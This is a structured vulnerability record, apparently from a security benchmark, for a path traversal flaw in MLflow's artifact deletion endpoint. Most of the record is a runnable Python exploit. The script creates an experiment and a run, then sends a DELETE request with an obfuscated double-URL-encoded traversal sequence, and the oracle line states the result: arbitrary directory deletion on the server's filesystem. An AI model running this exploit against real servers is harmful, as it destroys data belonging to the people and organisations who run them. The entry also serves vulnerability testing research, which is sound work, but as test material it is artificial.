title: Path traversal vulnerability in MLflow due to double URL decoding in artifact deletion
trigger_payload:
from argparse import ArgumentParser
from random import randbytes
from requests import Session
from urllib.parse import unquote
if __name__ == "__main__":
    parser = ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--path", required=True)
    args = parser.parse_args()
    url = args.url
    ajax_api = f"{url}/ajax-api/2.0/mlflow"
    with Session() as s:
        experiment_name = "e_" + randbytes(4).hex()
        rsp = s.post(f"{ajax_api}/experiments/create", json={
            "name" : experiment_name,
        })
        experiment_id = rsp.json()["experiment_id"]
        rsp = s.post(f"{ajax_api}/runs/create", json={
            "experiment_id" : experiment_id
        })
        run_uuid = rsp.json()["run"]["info"]["run_uuid"]
        # upload an artifact to force creation of './mlartifacts' directory in server
        # no artifacts were uploaded before:
        rsp = s.post(f"{ajax_api}/upload-artifact?run_uuid={run_uuid}&path=xxx", data={})
        dot = "%2%0952e"
        dots = dot + dot
        traverse = f"{dots}/{dots}/{dots}/{dots}/{dots}/{dots}/{dots}/{dots}/{dots}"
        rsp = s.delete(f'{url}/api/2.0/mlflow-artifacts/artifacts/file:{traverse}/')
        print(rsp.text)
        rsp = s.post(f"{ajax_api}/experiments/delete", json={
            "experiment_id" : experiment_id
        })
oracle: arbitrary directory deletion on the server filesystem
